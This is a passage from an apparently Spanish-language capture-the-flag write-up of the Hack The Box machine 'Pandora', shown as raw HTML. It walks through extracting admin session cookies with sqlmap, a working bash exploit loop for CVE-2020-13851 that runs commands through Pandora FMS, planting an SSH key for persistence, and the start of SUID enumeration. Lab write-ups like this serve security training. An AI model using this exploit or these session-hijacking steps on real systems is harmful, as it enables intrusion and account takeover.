&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; data        &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; text     &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; id_session  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; char&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;52&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; last_active &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; int&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;11&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+-------------+----------+

+---------------+---------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Table         &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; Entries &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+---------------+---------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; tsessions_php &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;2374&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+---------------+---------+
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Si hacemos &amp;lsquo;dump&amp;rsquo; a esta tabla vemos que en la columna &amp;ldquo;data&amp;rdquo; se encuentra el &lt;code&gt;id_usuario&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;+----------------------------+------------------------------------------------------+-------------+
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; id_session                 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; data                                                 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; last_active &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
+----------------------------+------------------------------------------------------+-------------+
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;03:00:47&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WARNING&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; console output will be trimmed to last &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; rows due to large table size
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 6talkd9q90r2n4mirsf84o7i8l &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL                                                 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1643412428&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 6vioehueu55qfihb5gp5r37jb8 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL                                                 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1643412425&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 6vresof3vasfvhfkvvbeiabs8l &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; id_usuario&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;s:6:&lt;span class=&#34;s2&#34;&gt;&amp;#34;daniel&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;                             &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1643412391&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; 70gjpanmgukjrr5kql0m0m0g27 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; NULL                                                 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1643413936&lt;/span&gt;  &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tomando en cuenta esto utilizamos &lt;code&gt;sql-shell&lt;/code&gt; de &lt;code&gt;sqlmap&lt;/code&gt; para obtener una cookie valida para el usuario &lt;code&gt;admin&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sql-shell&amp;gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; id_session,data from tsessions_php WHERE data like &lt;span class=&#34;s1&#34;&gt;&amp;#39;%dmin%&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;03:05:49&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; fetching SQL SELECT statement query output: &lt;span class=&#34;s1&#34;&gt;&amp;#39;select id_session,data from tsessions_php WHERE data like &amp;#39;&lt;/span&gt;%dmin%&lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;03:05:49&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; resumed: &lt;span class=&#34;s1&#34;&gt;&amp;#39;047ikbouedt2ln7me8hihc94uu&amp;#39;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;03:05:49&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; resumed: &lt;span class=&#34;s1&#34;&gt;&amp;#39;id_usuario|s:5:&amp;#34;admin&amp;#34;;alert_msg|a:0:{}new_chat|b:0;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;03:05:49&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; resumed: &lt;span class=&#34;s1&#34;&gt;&amp;#39;h131lluncrclh2cdh4p6g2uq20&amp;#39;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;03:05:49&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;INFO&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; resumed: &lt;span class=&#34;s1&#34;&gt;&amp;#39;id_usuario|s:5:&amp;#34;admin&amp;#34;;&amp;#39;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; id_session,data from tsessions_php WHERE data like &lt;span class=&#34;s1&#34;&gt;&amp;#39;%dmin%&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 047ikbouedt2ln7me8hihc94uu, id_usuario&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;s:5:&lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;alert_msg&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;a:0:&lt;span class=&#34;o&#34;&gt;{}&lt;/span&gt;new_chat&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;b:0&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; h131lluncrclh2cdh4p6g2uq20, id_usuario&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;s:5:&lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

sql-shell&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Utilizando esta cookie logramos obtener acceso como admin en Pandora.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pandora/Screenshot_20220131_211050.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;user---matt&#34;&gt;User - Matt&lt;/h1&gt;
&lt;h2 id=&#34;rce&#34;&gt;RCE&lt;/h2&gt;
&lt;p&gt;En el post se menciona que realizando bypass es suficiente para ejecutar comandos y hace referencia a &lt;a href=&#34;https://packetstormsecurity.com/files/cve/CVE-2020-13851&#34;&gt;CVE-2020-13851&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;hellip; In the end, a login bypass is sufficient for an attacker because as an administrator there are already possibilities to execute code (also see CVE-2020-13851).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Escribimos un pequeño script en bash tomando en cuenta el CVE que ejecuta comandos en la maquina.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;Enter a cookie:&amp;#34;&lt;/span&gt;
&lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; cookie

&lt;span class=&#34;k&#34;&gt;while&lt;/span&gt; :
&lt;span class=&#34;k&#34;&gt;do&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; -n &lt;span class=&#34;s2&#34;&gt;&amp;#34;cmd&amp;gt; &amp;#34;&lt;/span&gt;
    &lt;span class=&#34;nb&#34;&gt;read&lt;/span&gt; cmd
    &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$cmd&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;exit&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;then&lt;/span&gt; exit&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;fi&lt;/span&gt;
    curl -X POST &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://127.0.0.1/pandora_console/ajax.php?sec=eventos&amp;amp;sec2=operation/events/events&amp;#34;&lt;/span&gt; -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&amp;#34;&lt;/span&gt; -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Refer: http://127.0.0.1/pandora_console/index.php&amp;#34;&lt;/span&gt; -H &lt;span class=&#34;s2&#34;&gt;&amp;#34;Cookie: PHPSESSID=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$cookie&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt; -d &lt;span class=&#34;s2&#34;&gt;&amp;#34;page=include/ajax/events&amp;amp;perform_event_response=10000000&amp;amp;target=&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$cmd&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;amp;response_id=1&amp;#34;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;done&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Tras ejecutar el script logramos obtener acceso a la maquina como &lt;code&gt;matt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; π ~/htb/pandora ❯ ./pandora.sh
Enter a cookie:047ikbouedt2ln7me8hihc94uu
cmd&amp;gt; whoami&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;id
matt
&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;matt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;matt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;1000&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;matt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
cmd&amp;gt; &lt;span class=&#34;nb&#34;&gt;pwd&lt;/span&gt;
/var/www/pandora/pandora_console
cmd&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;shell-1&#34;&gt;Shell&lt;/h2&gt;
&lt;p&gt;Agregamos la clave publica del usuario &lt;code&gt;daniel&lt;/code&gt; al archivo &lt;code&gt;authorized_keys&lt;/code&gt; de &lt;code&gt;matt&lt;/code&gt; para acceder por SSH a este usuario.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;cmd&amp;gt; mkdir -p /home/matt/.ssh
cmd&amp;gt; &lt;span class=&#34;nb&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;ssh%2Drsa[.. snip ..]2BbLpHfxWWee4QQhzU%3D%20daniel%40pandora&amp;#34;&lt;/span&gt; &amp;gt; /home/matt/.ssh/authorized_keys
cmd&amp;gt; cat /home/matt/.ssh/authorized_keys
ssh-rsa A&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.. snip ..&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;+bLpHfxWWee4QQhzU&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; daniel@pandora
cmd&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Finalmente accedimos por SSH logrando obtener la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;daniel@pandora:~$ ssh matt@localhost
Welcome to Ubuntu 20.04.3 LTS &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GNU/Linux 5.4.0-91-generic x86_64&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; Feb 03:53:38 UTC &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt;

  System load:  0.0               Processes:             &lt;span class=&#34;m&#34;&gt;241&lt;/span&gt;
  Usage of /:   63.0% of 4.87GB   Users logged in:       &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
  Memory usage: 8%                IPv4 address &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; eth0: 10.10.11.136
  Swap usage:   0%

  &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; /boot is using 91.8% of 219MB


&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; updates can be applied immediately.


The list of available updates is more than a week old.
To check &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings



The programs included with the Ubuntu system are free software&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
the exact distribution terms &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

matt@pandora:~$ ls
user.txt
matt@pandora:~$ cat user.txt
3634ef5ba024e7a2e8ad08a9f01635bd
matt@pandora:~$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
&lt;p&gt;Listando ficheros &lt;code&gt;suid&lt;/code&gt; vemos &lt;code&gt;pandora_backup&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;matt@pandora:~$ find / -perm -4000 2&amp;gt;/dev/null&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;xargs ls -lah
-rwsr-sr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; daemon daemon      55K Nov &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; /usr/bin/at
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        84K Jul &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; /usr/bin/chfn
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        52K Jul &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; /usr/bin/chsh
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        39K Mar  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; /usr/bin/fusermount
-rwsr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root   root        87K Jul &lt;span class=&#34;m&#34;&gt;14&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; /usr/bin/gpasswd
